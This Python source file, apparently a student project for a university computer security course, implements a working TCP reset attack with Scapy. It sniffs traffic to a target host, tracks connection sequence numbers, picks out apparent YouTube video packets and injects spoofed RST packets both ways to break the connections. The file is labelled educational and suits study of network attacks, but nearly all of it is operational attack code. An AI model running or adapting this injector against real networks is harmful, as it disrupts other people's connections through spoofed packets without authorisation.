#!/usr/bin/env python3
"""
Packet Monitor and RST Injector for TCP Reset Attack
BUET CSE406 Computer Security Sessional
Educational Purpose Only
"""

import time
import threading
import signal
import hashlib
from collections import defaultdict, deque
from datetime import datetime
from scapy.all import sniff, send
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from network_utils import NetworkUtils

class ConnectionTracker:
    """Track TCP connection state for accurate RST injection"""
    
    def __init__(self, max_connections=1000):
        self.connections = {}
        self.max_connections = max_connections
        self.lock = threading.Lock()
    
    def get_connection_key(self, ip_src, port_src, ip_dst, port_dst):
        """Generate unique connection identifier"""
        return f"{ip_src}:{port_src}->{ip_dst}:{port_dst}"
    
    def update_connection(self, packet):
        """Update connection state from packet"""
        if not packet.haslayer(IP) or not packet.haslayer(TCP):
            return None
        
        ip_layer = packet[IP]
        tcp_layer = packet[TCP]
        
        # Create bidirectional keys
        key1 = self.get_connection_key(ip_layer.src, tcp_layer.sport, 
                                      ip_layer.dst, tcp_layer.dport)
        key2 = self.get_connection_key(ip_layer.dst, tcp_layer.dport,
                                      ip_layer.src, tcp_layer.sport)
        
        with self.lock:
            # Use existing connection or create new one
            conn_key = key1 if key1 in self.connections else key2
            if conn_key not in self.connections:
                conn_key = key1
                self.connections[conn_key] = {
                    'src_ip': ip_layer.src,
                    'src_port': tcp_layer.sport,
                    'dst_ip': ip_layer.dst, 
                    'dst_port': tcp_layer.dport,
                    'seq': tcp_layer.seq,
                    'ack': tcp_layer.ack,
                    'window': tcp_layer.window,
                    'last_seen': time.time(),
                    'packet_count': 0,
                    'data_size': 0
                }
            
            # Update connection state
            conn = self.connections[conn_key]
            conn['seq'] = tcp_layer.seq
            conn['ack'] = tcp_layer.ack
            conn['window'] = tcp_layer.window
            conn['last_seen'] = time.time()
            conn['packet_count'] += 1
            conn['data_size'] += len(tcp_layer.payload) if tcp_layer.payload else 0
            
            # Cleanup old connections
            if len(self.connections) > self.max_connections:
                self._cleanup_connections()
            
            return conn_key
    
    def get_connection(self, conn_key):
        """Get connection details"""
        with self.lock:
            return self.connections.get(conn_key, None)
    
    def _cleanup_connections(self):
        """Remove old connections to prevent memory leak"""
        current_time = time.time()
        timeout = 300  # 5 minutes
        
        keys_to_remove = []
        for key, conn in self.connections.items():
            if current_time - conn['last_seen'] > timeout:
                keys_to_remove.append(key)
        
        for key in keys_to_remove:
            del self.connections[key]
        
        print(f"[MONITOR] Cleaned up {len(keys_to_remove)} old connections")

class RSTInjector:
    """TCP RST packet injection engine"""
    
    def __init__(self, target_ip, interface, max_rst_per_connection=3):
        self.target_ip = target_ip
        self.interface = interface
        self.max_rst_per_connection = max_rst_per_connection
        
        self.injection_count = defaultdict(int)
        self.total_injections = 0
        self.successful_injections = 0
        
        self.running = False
        self.lock = threading.Lock()
    
    def should_inject_rst(self, connection, packet):
        """Determine if RST should be injected for this connection"""
        if not connection:
            return False
        
        # Check injection limit per connection
        conn_key = f"{connection['src_ip']}:{connection['src_port']}->{connection['dst_ip']}:{connection['dst_port']}"
        if self.injection_count[conn_key] >= self.max_rst_per_connection:
            return False
        
        # Only inject for data packets (not control packets)
        if packet.haslayer(TCP):
            tcp_layer = packet[TCP]
            if len(tcp_layer.payload) > 0 and len(packet) > 1400:  # Likely video data
                return True
        
        return False
    
    def calculate_rst_sequence(self, connection, original_packet):
        """Calculate correct sequence number for RST packet"""
        if not connection or not original_packet.haslayer(TCP):
            return None
        
        tcp_layer = original_packet[TCP]
        
        # For RST to server: use server's next expected sequence
        if original_packet[IP].dst == self.target_ip:
            # This is server -> client, so RST client -> server
            return tcp_layer.ack
        else:
            # This is client -> server, so RST server -> client  
            return tcp_layer.seq + len(tcp_layer.payload)
    
    def create_rst_packet(self, connection, original_packet, direction='to_client'):
        """Create TCP RST packet"""
        if not connection or not original_packet.haslayer(IP):
            return None
        
        orig_ip = original_packet[IP]
        orig_tcp = original_packet[TCP]
        
        try:
            # Calculate payload length more accurately
            payload_len = len(orig_tcp.payload) if orig_tcp.payload else 0
            
            if direction == 'to_client':
                # RST from server to client
                rst_packet = IP(
                    src=orig_ip.src,           # Spoof server IP
                    dst=orig_ip.dst,           # Send to client
                    ttl=64
                ) / TCP(
                    sport=orig_tcp.sport,      # Server port
                    dport=orig_tcp.dport,      # Client port
                    flags="R",                 # RST flag
                    seq=orig_tcp.seq + payload_len,  # Next expected seq
                    ack=0,                     # RST packets don't use ACK
                    window=0                   # RST packets have zero window
                )
            else:
                # RST from client to server  
                rst_packet = IP(
                    src=orig_ip.dst,           # Spoof client IP
                    dst=orig_ip.src,           # Send to server
                    ttl=64
                ) / TCP(
                    sport=orig_tcp.dport,      # Client port
                    dport=orig_tcp.sport,      # Server port
                    flags="R",                 # RST flag
                    seq=orig_tcp.ack,          # Client's next seq
                    ack=0,                     # RST packets don't use ACK
                    window=0                   # RST packets have zero window
                )
            
            return rst_packet
            
        except Exception as e:
            print(f"[RST] Error creating RST packet: {e}")
            return None
    
    def inject_rst_packets(self, connection, original_packet):
        """Inject RST packets in both directions"""
        with self.lock:
            conn_key = f"{connection['src_ip']}:{connection['src_port']}->{connection['dst_ip']}:{connection['dst_port']}"
            
            try:
                # Create RST packets for both directions
                rst_to_client = self.create_rst_packet(connection, original_packet, 'to_client')
                rst_to_server = self.create_rst_packet(connection, original_packet, 'to_server')
                
                injection_success = 0
                
                # Send RST to client
                if rst_to_client:
                    send(rst_to_client, verbose=False, iface=self.interface)
                    injection_success += 1
                    print(f"[RST] Injected RST to client: {rst_to_client[IP].dst}:{rst_to_client[TCP].dport}")
                
                # Send RST to server
                if rst_to_server:
                    send(rst_to_server, verbose=False, iface=self.interface)
                    injection_success += 1
                    print(f"[RST] Injected RST to server: {rst_to_server[IP].dst}:{rst_to_server[TCP].dport}")
                
                # Update statistics
                self.injection_count[conn_key] += 1
                self.total_injections += injection_success
                if injection_success == 2:
                    self.successful_injections += 1
                
                return injection_success > 0
                
            except Exception as e:
                print(f"[RST] Error injecting RST packets: {e}")
                return False
    
    def get_statistics(self):
        """Get injection statistics"""
        with self.lock:
            return {
                'total_injections': self.total_injections,
                'successful_injections': self.successful_injections,
                'connections_attacked': len(self.injection_count),
                'injection_rate': self.successful_injections / max(1, self.total_injections) * 100
            }

class PacketMonitor:
    """Main packet monitoring and attack coordination"""
    
    def __init__(self, target_ip, interface, config=None):
        self.target_ip = target_ip
        self.interface = interface
        self.config = config
        
        self.connection_tracker = ConnectionTracker()
        self.rst_injector = RSTInjector(target_ip, interface)
        
        self.running = False
        self.monitor_thread = None
        self.packet_count = 0
        self.youtube_packet_count = 0
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _signal_handler(self, signum, frame):
        """Handle interrupt signals"""
        print(f"\n[MONITOR] Received signal {signum}, stopping packet monitor...")
        self.stop_monitoring()
    
    def packet_handler(self, packet):
        """Process captured packets"""
        self.packet_count += 1
        
        try:
            # Check if this is YouTube traffic
            if NetworkUtils.is_youtube_traffic(packet):
                self.youtube_packet_count += 1
                
                # Update connection tracking
                conn_key = self.connection_tracker.update_connection(packet)
                connection = self.connection_tracker.get_connection(conn_key)
                
                if connection:
                    print(f"[MONITOR] YouTube packet: {packet[IP].src}:{packet[TCP].sport} -> "
                          f"{packet[IP].dst}:{packet[TCP].dport} (seq={packet[TCP].seq}, "
                          f"size={len(packet)})")
                    
                    # Decide whether to inject RST
                    if self.rst_injector.should_inject_rst(connection, packet):
                        self.rst_injector.inject_rst_packets(connection, packet)
            
            # Print statistics periodically
            if self.packet_count % 1000 == 0:
                self._print_statistics()
                
        except Exception as e:
            print(f"[MONITOR] Error processing packet: {e}")
    
    def _print_statistics(self):
        """Print monitoring statistics"""
        stats = self.rst_injector.get_statistics()
        print(f"\n[STATS] Packets: {self.packet_count}, YouTube: {self.youtube_packet_count}, "
              f"RST Injections: {stats['total_injections']}, "
              f"Success Rate: {stats['injection_rate']:.1f}%")
    
    def start_monitoring(self, filter_str=None):
        """Start packet monitoring"""
        if self.running:
            print("[MONITOR] Packet monitoring already running")
            return False
        
        if not filter_str:
            filter_str = f"tcp and host {self.target_ip}"
        
        print(f"[MONITOR] Starting packet capture on {self.interface}")
        print(f"[MONITOR] Filter: {filter_str}")
        
        try:
            self.running = True
            
            # Start monitoring in background thread
            self.monitor_thread = threading.Thread(
                target=self._monitor_loop,
                args=(filter_str,),
                daemon=True
            )
            self.monitor_thread.start()
            
            print("[MONITOR] Packet monitoring started successfully")
            return True
            
        except Exception as e:
            print(f"[MONITOR] Failed to start monitoring: {e}")
            self.running = False
            return False
    
    def _monitor_loop(self, filter_str):
        """Main monitoring loop"""
        try:
            print(f"[MONITOR] Capturing packets with filter: {filter_str}")
            sniff(
                iface=self.interface,
                filter=filter_str,
                prn=self.packet_handler,
                store=0,
                stop_filter=lambda x: not self.running
            )
        except Exception as e:
            print(f"[MONITOR] Error in monitoring loop: {e}")
        finally:
            print("[MONITOR] Monitoring loop stopped")
    
    def stop_monitoring(self):
        """Stop packet monitoring"""
        if not self.running:
            print("[MONITOR] Packet monitoring not running")
            return
        
        print("[MONITOR] Stopping packet monitoring...")
        self.running = False
        
        # Wait for monitor thread to finish
        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=5)
        
        # Print final statistics
        self._print_statistics()
        print("[MONITOR] Packet monitoring stopped")
    
    def is_running(self):
        """Check if monitoring is active"""
        return self.running

if __name__ == "__main__":
    # Test packet monitor
    print("=== Packet Monitor Test ===")
    
    target_ip = "192.168.1.100"  # Replace with actual target
    interface = "eth0"            # Replace with actual interface
    
    monitor = PacketMonitor(target_ip, interface)
    
    try:
        print("Starting 10-second monitoring test...")
        monitor.start_monitoring()
        time.sleep(10)
        monitor.stop_monitoring()
    except KeyboardInterrupt:
        monitor.stop_monitoring()
    except Exception as e:
        print(f"Test failed: {e}")
